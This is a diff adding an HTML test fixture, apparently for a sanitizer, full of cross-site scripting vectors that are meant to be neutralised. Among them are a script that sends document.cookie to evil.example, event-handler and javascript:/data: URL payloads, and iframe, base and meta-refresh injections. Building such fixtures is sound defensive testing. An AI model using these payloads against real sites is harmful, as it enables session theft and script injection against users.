@@ -1,0 +1,22 @@
+<article>
+<h1>Hostile fixture</h1>
+<p>Every vector below must be inert in the stored output.</p>
+<script>document.location='https://evil.example/steal?c='+document.cookie</script>
+<p onmouseover="alert(1)">Event handler in attribute.</p>
+<img src="x" onerror="alert(document.domain)">
+<img src="javascript:alert(1)" alt="javascript src">
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="data url src">
+<a href="javascript:alert(1)">javascript: link</a>
+<a href="data:text/html,<script>alert(1)</script>">data: link</a>
+<a href="https://example.com/ok" onclick="alert(1)">handler on a good link</a>
+<svg onload="alert(1)"><circle r="1"/></svg>
+<base href="https://evil.example/">
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/o.swf"></object>
+<embed src="https://evil.example/e.swf">
+<form action="javascript:alert(1)"><input name="q" value="x"><button>go</button></form>
+<style>body { background: url("javascript:alert(1)"); }</style>
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<p>Legitimate <strong>content</strong> around the attacks
+<a href="https://example.com/fine">survives</a>.</p>
+</article>
